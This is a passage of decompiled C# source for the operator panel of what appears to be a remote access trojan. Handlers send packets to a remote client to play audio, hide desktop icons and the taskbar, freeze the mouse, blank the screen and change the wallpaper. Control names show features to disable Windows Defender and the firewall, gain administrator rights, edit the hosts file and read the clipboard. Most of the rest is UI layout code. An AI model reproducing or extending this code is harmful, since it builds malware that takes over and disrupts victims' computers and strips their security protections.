            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        }
        catch
        {
        }
    }

    private void LogsHosts_Click(object sender, EventArgs e)
    {
        LogsHosts.Text = "...";
        LogsHosts.ForeColor = Color.Black;
    }

    private void PlayAudio_Click(object sender, EventArgs e)
    {
        try
        {
            using OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Title = "Choose sound file";
            openFileDialog.Filter = "File (*.wav)|*.wav";
            openFileDialog.Multiselect = false;
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "Sound";
                msgPack.ForcePathObject("WAV").SetAsBytes(File.ReadAllBytes(openFileDialog.FileName));
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(this, ex.Message, "Options! | Fun", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1);
        }
    }

    private void HideIconDesktop_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "HidenIconDesktoop";
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        }
        catch
        {
        }
    }

    private void ShowIconDesktop_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "HidenIconDesktoop";
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        }
        catch
        {
        }
    }

    private void MouseStop_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "MouseStop";
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        }
        catch
        {
        }
    }

    private void MouseRestore_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "MouseStart";
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        }
        catch
        {
        }
    }

    private void HideTaskBar_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "Taskbar-";
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        }
        catch
        {
        }
    }

    private void ShowTaskbar_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "Taskbar+";
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        }
        catch
        {
        }
    }

    private void LockedScreen_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "blankscreen+";
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        }
        catch
        {
        }
    }

    private void UnlockScreen_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "blankscreen-";
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        }
        catch
        {
        }
    }

    private void ChagneBackgroundDesktop_Click(object sender, EventArgs e)
    {
        try
        {
            using OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Title = "Choose jpg";
            openFileDialog.Filter = "Jpg |*.jpg";
            openFileDialog.Multiselect = false;
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "BackgroundDesktop";
                msgPack.ForcePathObject("Image").SetAsBytes(File.ReadAllBytes(openFileDialog.FileName));
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(this, ex.Message, "Options! | Fun ", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1);
        }
    }

    protected override void Dispose(bool disposing)
    {
        if (disposing && components != null)
        {
            components.Dispose();
        }
        base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
        this.components = new System.ComponentModel.Container();
        System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Forms.Options));
        Utilities.BunifuPages.BunifuAnimatorNS.Animation animation = new Utilities.BunifuPages.BunifuAnimatorNS.Animation();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties2 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties3 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties4 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle4 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle5 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle6 = new System.Windows.Forms.DataGridViewCellStyle();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties5 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties6 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties7 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties8 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        this.FormElipse = new Bunifu.Framework.UI.BunifuElipse(this.components);
        this.panelForm = new System.Windows.Forms.Panel();
        this.PaneControll = new System.Windows.Forms.Panel();
        this.ButHosts = new Guna.UI2.WinForms.Guna2Button();
        this.ButFun = new Guna.UI2.WinForms.Guna2Button();
        this.ButAnti = new Guna.UI2.WinForms.Guna2Button();
        this.ButMessageBox = new Guna.UI2.WinForms.Guna2Button();
        this.ButClipboad = new Guna.UI2.WinForms.Guna2Button();
        this.guna2Button_0 = new Guna.UI2.WinForms.Guna2Button();
        this.ButAdmin = new Guna.UI2.WinForms.Guna2Button();
        this.ButSettings = new Guna.UI2.WinForms.Guna2Button();
        this.PageOption = new Bunifu.UI.WinForms.BunifuPages();
        this.PageSettings = new System.Windows.Forms.TabPage();
        this.pictureBox2 = new System.Windows.Forms.PictureBox();
        this.guna2GradientButton_0 = new Guna.UI2.WinForms.Guna2GradientButton();
        this.guna2GradientButton_1 = new Guna.UI2.WinForms.Guna2GradientButton();
        this.guna2HtmlLabel6 = new Guna.UI2.WinForms.Guna2HtmlLabel();
        this.EnabledRegistry = new Guna.UI2.WinForms.Guna2GradientButton();
        this.DisabledRegistry = new Guna.UI2.WinForms.Guna2GradientButton();
        this.guna2HtmlLabel5 = new Guna.UI2.WinForms.Guna2HtmlLabel();
        this.EnabledAnti = new Guna.UI2.WinForms.Guna2GradientButton();
        this.DisabledAnti = new Guna.UI2.WinForms.Guna2GradientButton();
        this.guna2HtmlLabel2 = new Guna.UI2.WinForms.Guna2HtmlLabel();
        this.EnabledFirewall = new Guna.UI2.WinForms.Guna2GradientButton();
        this.DisabledWD = new Guna.UI2.WinForms.Guna2GradientButton();
        this.guna2HtmlLabel1 = new Guna.UI2.WinForms.Guna2HtmlLabel();
        this.DisabledFirewall = new Guna.UI2.WinForms.Guna2GradientButton();
        this.guna2HtmlLabel3 = new Guna.UI2.WinForms.Guna2HtmlLabel();
        this.PageAdmin = new System.Windows.Forms.TabPage();
        this.StateAdmin = new Bunifu.UI.WinForms.BunifuLabel();
        this.guna2GradientButton_2 = new Guna.UI2.WinForms.Guna2GradientButton();
        this.guna2GradientButton_3 = new Guna.UI2.WinForms.Guna2GradientButton();
        this.AddUAC = new Guna.UI2.WinForms.Guna2GradientButton();
        this.RunAsadminstartor = new Guna.UI2.WinForms.Guna2GradientButton();
        this.bunifuLabel3 = new Bunifu.UI.WinForms.BunifuLabel();
        this.InfoAdmin = new Bunifu.UI.WinForms.BunifuLabel();
        this.tabPage_0 = new System.Windows.Forms.TabPage();
        this.PanelMune = new System.Windows.Forms.Panel();
        this.TextReferences = new Bunifu.UI.WinForms.BunifuTextBox();
        this.ListReferences = new Guna.UI2.WinForms.Guna2DataGridView();
        this.Column1 = new System.Windows.Forms.DataGridViewImageColumn();
        this.Column2 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.ContectRefrences = new System.Windows.Forms.ContextMenuStrip(this.components);
        this.DeleteRefrences = new System.Windows.Forms.ToolStripMenuItem();
        this.MuneClose = new System.Windows.Forms.Label();
        this.bunifuLabel17 = new Bunifu.UI.WinForms.BunifuLabel();
        this.OKReferences = new Guna.UI2.WinForms.Guna2GradientButton();
        this.toolStrip1 = new System.Windows.Forms.ToolStrip();
        this.toolStripSeparator1 = new System.Windows.Forms.ToolStripSeparator();
        this.LogsNET = new System.Windows.Forms.ToolStripLabel();
        this.TopTols = new System.Windows.Forms.ToolStrip();
        this.toolStripSeparator9 = new System.Windows.Forms.ToolStripSeparator();
        this.NETTest = new System.Windows.Forms.ToolStripButton();
        this.toolStripSeparator8 = new System.Windows.Forms.ToolStripSeparator();
        this.toolStripButton_0 = new System.Windows.Forms.ToolStripButton();
        this.toolStripSeparator2 = new System.Windows.Forms.ToolStripSeparator();
        this.toolStripLabel3 = new System.Windows.Forms.ToolStripLabel();
        this.ComboxLanguages = new System.Windows.Forms.ToolStripComboBox();
        this.ReferencesMune = new System.Windows.Forms.ToolStripButton();
        this.RixhTextBoxNET = new System.Windows.Forms.RichTextBox();
        this.PageClipboard = new System.Windows.Forms.TabPage();
        this.toolStrip2 = new System.Windows.Forms.ToolStrip();
        this.toolStripSeparator3 = new System.Windows.Forms.ToolStripSeparator();
        this.ClipCopy = new System.Windows.Forms.ToolStripButton();
        this.ClipPaste = new System.Windows.Forms.ToolStripButton();
        this.ClipClear = new System.Windows.Forms.ToolStripButton();
        this.richTextBoxClipboard = new System.Windows.Forms.RichTextBox();
        this.PageMessageBox = new System.Windows.Forms.TabPage();
        this.toolStrip3 = new System.Windows.Forms.ToolStrip();
        this.toolStripSeparator4 = new System.Windows.Forms.ToolStripSeparator();
        this.TestMessageBox = new System.Windows.Forms.ToolStripButton();
        this.SendMessageBox = new System.Windows.Forms.ToolStripButton();
        this.toolStripLabel1 = new System.Windows.Forms.ToolStripLabel();
        this.TitleMessageBox = new System.Windows.Forms.ToolStripTextBox();
        this.toolStripLabel4 = new System.Windows.Forms.ToolStripLabel();
        this.ComTypeMessageBox = new System.Windows.Forms.ToolStripComboBox();
        this.toolStripLabel5 = new System.Windows.Forms.ToolStripLabel();
        this.ComIconMessageBox = new System.Windows.Forms.ToolStripComboBox();
        this.RichMesgBox = new System.Windows.Forms.RichTextBox();
        this.PageAnti = new System.Windows.Forms.TabPage();
        this.ListAntiMalware = new Guna.UI2.WinForms.Guna2DataGridView();
        this.dataGridViewImageColumn1 = new System.Windows.Forms.DataGridViewImageColumn();
        this.dataGridViewTextBoxColumn1 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.ContexAntiMelware = new System.Windows.Forms.ContextMenuStrip(this.components);
        this.DeleteProcessAnti = new System.Windows.Forms.ToolStripMenuItem();
        this.toolStrip4 = new System.Windows.Forms.ToolStrip();
        this.toolStripSeparator5 = new System.Windows.Forms.ToolStripSeparator();
        this.PowerAntimalware = new System.Windows.Forms.ToolStripButton();
        this.toolStripLabel6 = new System.Windows.Forms.ToolStripLabel();
        this.TexProcessname = new System.Windows.Forms.ToolStripTextBox();
        this.AddProcessname = new System.Windows.Forms.ToolStripButton();
        this.PageFun = new System.Windows.Forms.TabPage();
        this.PlayAudio = new Guna.UI2.WinForms.Guna2GradientButton();
        this.StateIndex = new Guna.UI2.WinForms.Guna2HtmlLabel();
        this.guna2HtmlLabel10 = new Guna.UI2.WinForms.Guna2HtmlLabel();
        this.StardIndex = new Guna.UI2.WinForms.Guna2GradientButton();
        this.StopIndex = new Guna.UI2.WinForms.Guna2GradientButton();
        this.FilenameIndex = new Bunifu.UI.WinForms.BunifuTextBox();
        this.MouseRestore = new Guna.UI2.WinForms.Guna2GradientButton();
        this.guna2HtmlLabel7 = new Guna.UI2.WinForms.Guna2HtmlLabel();
        this.MouseStop = new Guna.UI2.WinForms.Guna2GradientButton();
        this.ChagneBackgroundDesktop = new Guna.UI2.WinForms.Guna2GradientButton();
        this.ShowTaskbar = new Guna.UI2.WinForms.Guna2GradientButton();
        this.guna2HtmlLabel4 = new Guna.UI2.WinForms.Guna2HtmlLabel();
        this.HideTaskBar = new Guna.UI2.WinForms.Guna2GradientButton();
        this.UnlockScreen = new Guna.UI2.WinForms.Guna2GradientButton();
        this.ImageIndex = new System.Windows.Forms.PictureBox();
        this.ShowIconDesktop = new Guna.UI2.WinForms.Guna2GradientButton();
        this.LockedScreen = new Guna.UI2.WinForms.Guna2GradientButton();
        this.guna2HtmlLabel9 = new Guna.UI2.WinForms.Guna2HtmlLabel();
        this.HideIconDesktop = new Guna.UI2.WinForms.Guna2GradientButton();
        this.PageHosts = new System.Windows.Forms.TabPage();
        this.toolStrip5 = new System.Windows.Forms.ToolStrip();
        this.toolStripSeparator6 = new System.Windows.Forms.ToolStripSeparator();
        this.SaveHosts = new System.Windows.Forms.ToolStripButton();
        this.toolStripSeparator7 = new System.Windows.Forms.ToolStripSeparator();
        this.RefreshHosts = new System.Windows.Forms.ToolStripButton();
        this.toolStripSeparator_0 = new System.Windows.Forms.ToolStripSeparator();
        this.LogsHosts = new System.Windows.Forms.ToolStripLabel();
        this.TextHosts = new System.Windows.Forms.RichTextBox();
        this.FormResizeBox1 = new Guna.UI2.WinForms.Guna2ResizeBox();
        this.PanelTitle = new Bunifu.UI.WinForms.BunifuPanel();
        this.TitlePage = new Bunifu.UI.WinForms.BunifuLabel();
        this.LoaderConnect = new Bunifu.UI.WinForms.BunifuLoader();
        this.ButtClose = new Guna.UI2.WinForms.Guna2CircleButton();
        this.ButtionMinimized = new Guna.UI2.WinForms.Guna2CircleButton();
        this.ButtonMaximized = new Guna.UI2.WinForms.Guna2CircleButton();
        this.UserIdInfo = new Bunifu.UI.WinForms.BunifuLabel();
        this.bunifuLabel1 = new Bunifu.UI.WinForms.BunifuLabel();
        this.ImageLogo = new System.Windows.Forms.PictureBox();
        this.PanelBottom = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelLeft = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelTOP = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelRight = new Bunifu.UI.WinForms.BunifuPanel();
        this.FormDragControl1 = new Bunifu.Framework.UI.BunifuDragControl(this.components);
        this.Timer1 = new System.Windows.Forms.Timer(this.components);
        this.im = new System.Windows.Forms.ImageList(this.components);
        this.panelForm.SuspendLayout();
        this.PaneControll.SuspendLayout();
        this.PageOption.SuspendLayout();
        this.PageSettings.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.pictureBox2).BeginInit();
        this.PageAdmin.SuspendLayout();
        this.tabPage_0.SuspendLayout();
        this.PanelMune.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.ListReferences).BeginInit();
        this.ContectRefrences.SuspendLayout();
        this.toolStrip1.SuspendLayout();
        this.TopTols.SuspendLayout();
        this.PageClipboard.SuspendLayout();
        this.toolStrip2.SuspendLayout();
        this.PageMessageBox.SuspendLayout();
        this.toolStrip3.SuspendLayout();
        this.PageAnti.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.ListAntiMalware).BeginInit();
        this.ContexAntiMelware.SuspendLayout();
        this.toolStrip4.SuspendLayout();
        this.PageFun.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.ImageIndex).BeginInit();
        this.PageHosts.SuspendLayout();
        this.toolStrip5.SuspendLayout();
        this.PanelTitle.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.ImageLogo).BeginInit();
        base.SuspendLayout();
        this.FormElipse.ElipseRadius = 4;
        this.FormElipse.TargetControl = this.panelForm;
        this.panelForm.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.panelForm.BackColor = System.Drawing.Color.White;
        this.panelForm.Controls.Add(this.PaneControll);
        this.panelForm.Controls.Add(this.PageOption);
        this.panelForm.Controls.Add(this.FormResizeBox1);
        this.panelForm.Controls.Add(this.PanelTitle);
        this.panelForm.Controls.Add(this.PanelBottom);
        this.panelForm.Controls.Add(this.PanelLeft);
        this.panelForm.Controls.Add(this.PanelTOP);
        this.panelForm.Controls.Add(this.PanelRight);
        this.panelForm.Location = new System.Drawing.Point(12, 12);
        this.panelForm.Name = "panelForm";
        this.panelForm.Size = new System.Drawing.Size(832, 586);
        this.panelForm.TabIndex = 574;
        this.panelForm.Visible = false;
        this.PaneControll.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
        this.PaneControll.Controls.Add(this.ButHosts);
        this.PaneControll.Controls.Add(this.ButFun);
        this.PaneControll.Controls.Add(this.ButAnti);
        this.PaneControll.Controls.Add(this.ButMessageBox);
        this.PaneControll.Controls.Add(this.ButClipboad);
        this.PaneControll.Controls.Add(this.guna2Button_0);
        this.PaneControll.Controls.Add(this.ButAdmin);
        this.PaneControll.Controls.Add(this.ButSettings);
        this.PaneControll.Location = new System.Drawing.Point(16, 112);
        this.PaneControll.Name = "PaneControll";
        this.PaneControll.Size = new System.Drawing.Size(45, 442);
        this.PaneControll.TabIndex = 610;
        this.ButHosts.Anchor = System.Windows.Forms.AnchorStyles.Left;
        this.ButHosts.BackColor = System.Drawing.Color.Transparent;
        this.ButHosts.BorderRadius = 10;
        this.ButHosts.ButtonMode = Guna.UI2.WinForms.Enums.ButtonMode.RadioButton;
        this.ButHosts.CheckedState.BorderColor = System.Drawing.Color.White;
        this.ButHosts.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.ButHosts.CheckedState.FillColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButHosts.CheckedState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButHosts.CheckedState.Parent = this.ButHosts;
        this.ButHosts.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButHosts.CustomBorderColor = System.Drawing.Color.White;
        this.ButHosts.CustomImages.CheckedImage = (System.Drawing.Image)resources.GetObject("ButHosts.CustomImages.CheckedImage");
        this.ButHosts.CustomImages.HoveredImage = (System.Drawing.Image)resources.GetObject("ButHosts.CustomImages.HoveredImage");
        this.ButHosts.CustomImages.Image = (System.Drawing.Image)resources.GetObject("ButHosts.CustomImages.Image");
        this.ButHosts.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.ButHosts.CustomImages.ImageSize = new System.Drawing.Size(24, 24);
        this.ButHosts.CustomImages.Parent = this.ButHosts;
        this.ButHosts.FillColor = System.Drawing.Color.White;
        this.ButHosts.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButHosts.ForeColor = System.Drawing.Color.White;
        this.ButHosts.HoverState.BorderColor = System.Drawing.Color.White;
        this.ButHosts.HoverState.CustomBorderColor = System.Drawing.Color.White;
        this.ButHosts.HoverState.FillColor = System.Drawing.Color.White;
        this.ButHosts.HoverState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButHosts.HoverState.Parent = this.ButHosts;
        this.ButHosts.ImageSize = new System.Drawing.Size(27, 27);
        this.ButHosts.Location = new System.Drawing.Point(4, 358);
        this.ButHosts.Name = "ButHosts";
        this.ButHosts.PressedColor = System.Drawing.Color.White;
        this.ButHosts.ShadowDecoration.Parent = this.ButHosts;
        this.ButHosts.Size = new System.Drawing.Size(38, 38);
        this.ButHosts.TabIndex = 26;
        this.ButHosts.UseTransparentBackground = true;
        this.ButHosts.Click += new System.EventHandler(ButHosts_Click);
        this.ButFun.Anchor = System.Windows.Forms.AnchorStyles.Left;
        this.ButFun.BackColor = System.Drawing.Color.Transparent;
        this.ButFun.BorderRadius = 10;
        this.ButFun.ButtonMode = Guna.UI2.WinForms.Enums.ButtonMode.RadioButton;
        this.ButFun.CheckedState.BorderColor = System.Drawing.Color.White;
        this.ButFun.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.ButFun.CheckedState.FillColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButFun.CheckedState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButFun.CheckedState.Parent = this.ButFun;
        this.ButFun.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButFun.CustomBorderColor = System.Drawing.Color.White;
        this.ButFun.CustomImages.CheckedImage = (System.Drawing.Image)resources.GetObject("ButFun.CustomImages.CheckedImage");
        this.ButFun.CustomImages.HoveredImage = (System.Drawing.Image)resources.GetObject("ButFun.CustomImages.HoveredImage");
        this.ButFun.CustomImages.Image = (System.Drawing.Image)resources.GetObject("ButFun.CustomImages.Image");
        this.ButFun.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.ButFun.CustomImages.ImageSize = new System.Drawing.Size(24, 24);
        this.ButFun.CustomImages.Parent = this.ButFun;
        this.ButFun.FillColor = System.Drawing.Color.White;
        this.ButFun.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButFun.ForeColor = System.Drawing.Color.White;
        this.ButFun.HoverState.BorderColor = System.Drawing.Color.White;
        this.ButFun.HoverState.CustomBorderColor = System.Drawing.Color.White;
        this.ButFun.HoverState.FillColor = System.Drawing.Color.White;
        this.ButFun.HoverState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButFun.HoverState.Parent = this.ButFun;
        this.ButFun.ImageSize = new System.Drawing.Size(27, 27);
        this.ButFun.Location = new System.Drawing.Point(4, 314);
        this.ButFun.Name = "ButFun";
        this.ButFun.PressedColor = System.Drawing.Color.White;
        this.ButFun.ShadowDecoration.Parent = this.ButFun;
        this.ButFun.Size = new System.Drawing.Size(38, 38);
        this.ButFun.TabIndex = 25;
        this.ButFun.UseTransparentBackground = true;
        this.ButFun.Click += new System.EventHandler(ButFun_Click);
        this.ButAnti.Anchor = System.Windows.Forms.AnchorStyles.Left;
        this.ButAnti.BackColor = System.Drawing.Color.Transparent;
        this.ButAnti.BorderRadius = 10;
        this.ButAnti.ButtonMode = Guna.UI2.WinForms.Enums.ButtonMode.RadioButton;
        this.ButAnti.CheckedState.BorderColor = System.Drawing.Color.White;
        this.ButAnti.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.ButAnti.CheckedState.FillColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButAnti.CheckedState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButAnti.CheckedState.Parent = this.ButAnti;
        this.ButAnti.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButAnti.CustomBorderColor = System.Drawing.Color.White;
        this.ButAnti.CustomImages.CheckedImage = (System.Drawing.Image)resources.GetObject("ButAnti.CustomImages.CheckedImage");
        this.ButAnti.CustomImages.HoveredImage = (System.Drawing.Image)resources.GetObject("ButAnti.CustomImages.HoveredImage");
        this.ButAnti.CustomImages.Image = (System.Drawing.Image)resources.GetObject("ButAnti.CustomImages.Image");
        this.ButAnti.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.ButAnti.CustomImages.ImageSize = new System.Drawing.Size(24, 24);
        this.ButAnti.CustomImages.Parent = this.ButAnti;
        this.ButAnti.FillColor = System.Drawing.Color.White;
        this.ButAnti.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButAnti.ForeColor = System.Drawing.Color.White;
        this.ButAnti.HoverState.BorderColor = System.Drawing.Color.White;
        this.ButAnti.HoverState.CustomBorderColor = System.Drawing.Color.White;
        this.ButAnti.HoverState.FillColor = System.Drawing.Color.White;
        this.ButAnti.HoverState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButAnti.HoverState.Parent = this.ButAnti;
        this.ButAnti.ImageSize = new System.Drawing.Size(27, 27);
        this.ButAnti.Location = new System.Drawing.Point(4, 270);
        this.ButAnti.Name = "ButAnti";
        this.ButAnti.PressedColor = System.Drawing.Color.White;
        this.ButAnti.ShadowDecoration.Parent = this.ButAnti;
        this.ButAnti.Size = new System.Drawing.Size(38, 38);
        this.ButAnti.TabIndex = 24;
        this.ButAnti.UseTransparentBackground = true;
        this.ButAnti.Click += new System.EventHandler(ButAnti_Click);
        this.ButMessageBox.Anchor = System.Windows.Forms.AnchorStyles.Left;
        this.ButMessageBox.BackColor = System.Drawing.Color.Transparent;
        this.ButMessageBox.BorderRadius = 10;
        this.ButMessageBox.ButtonMode = Guna.UI2.WinForms.Enums.ButtonMode.RadioButton;
        this.ButMessageBox.CheckedState.BorderColor = System.Drawing.Color.White;
        this.ButMessageBox.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.ButMessageBox.CheckedState.FillColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButMessageBox.CheckedState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButMessageBox.CheckedState.Parent = this.ButMessageBox;
        this.ButMessageBox.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButMessageBox.CustomBorderColor = System.Drawing.Color.White;
        this.ButMessageBox.CustomImages.CheckedImage = (System.Drawing.Image)resources.GetObject("ButMessageBox.CustomImages.CheckedImage");
        this.ButMessageBox.CustomImages.HoveredImage = (System.Drawing.Image)resources.GetObject("ButMessageBox.CustomImages.HoveredImage");
        this.ButMessageBox.CustomImages.Image = (System.Drawing.Image)resources.GetObject("ButMessageBox.CustomImages.Image");
        this.ButMessageBox.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.ButMessageBox.CustomImages.ImageSize = new System.Drawing.Size(24, 24);
        this.ButMessageBox.CustomImages.Parent = this.ButMessageBox;
        this.ButMessageBox.FillColor = System.Drawing.Color.White;
        this.ButMessageBox.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButMessageBox.ForeColor = System.Drawing.Color.White;
        this.ButMessageBox.HoverState.BorderColor = System.Drawing.Color.White;
        this.ButMessageBox.HoverState.CustomBorderColor = System.Drawing.Color.White;
        this.ButMessageBox.HoverState.FillColor = System.Drawing.Color.White;
        this.ButMessageBox.HoverState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButMessageBox.HoverState.Parent = this.ButMessageBox;
        this.ButMessageBox.ImageSize = new System.Drawing.Size(27, 27);
        this.ButMessageBox.Location = new System.Drawing.Point(4, 226);
        this.ButMessageBox.Name = "ButMessageBox";
        this.ButMessageBox.PressedColor = System.Drawing.Color.White;
        this.ButMessageBox.ShadowDecoration.Parent = this.ButMessageBox;
        this.ButMessageBox.Size = new System.Drawing.Size(38, 38);
        this.ButMessageBox.TabIndex = 23;
        this.ButMessageBox.UseTransparentBackground = true;
        this.ButMessageBox.Click += new System.EventHandler(ButMessageBox_Click);
        this.ButClipboad.Anchor = System.Windows.Forms.AnchorStyles.Left;
        this.ButClipboad.BackColor = System.Drawing.Color.Transparent;
        this.ButClipboad.BorderRadius = 10;
        this.ButClipboad.ButtonMode = Guna.UI2.WinForms.Enums.ButtonMode.RadioButton;
        this.ButClipboad.CheckedState.BorderColor = System.Drawing.Color.White;
        this.ButClipboad.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.ButClipboad.CheckedState.FillColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButClipboad.CheckedState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButClipboad.CheckedState.Parent = this.ButClipboad;
        this.ButClipboad.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButClipboad.CustomBorderColor = System.Drawing.Color.White;
        this.ButClipboad.CustomImages.CheckedImage = (System.Drawing.Image)resources.GetObject("ButClipboad.CustomImages.CheckedImage");
        this.ButClipboad.CustomImages.HoveredImage = (System.Drawing.Image)resources.GetObject("ButClipboad.CustomImages.HoveredImage");
        this.ButClipboad.CustomImages.Image = (System.Drawing.Image)resources.GetObject("ButClipboad.CustomImages.Image");
        this.ButClipboad.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.ButClipboad.CustomImages.ImageSize = new System.Drawing.Size(24, 24);
        this.ButClipboad.CustomImages.Parent = this.ButClipboad;
        this.ButClipboad.FillColor = System.Drawing.Color.White;
        this.ButClipboad.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButClipboad.ForeColor = System.Drawing.Color.White;
        this.ButClipboad.HoverState.BorderColor = System.Drawing.Color.White;
        this.ButClipboad.HoverState.CustomBorderColor = System.Drawing.Color.White;
        this.ButClipboad.HoverState.FillColor = System.Drawing.Color.White;
        this.ButClipboad.HoverState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
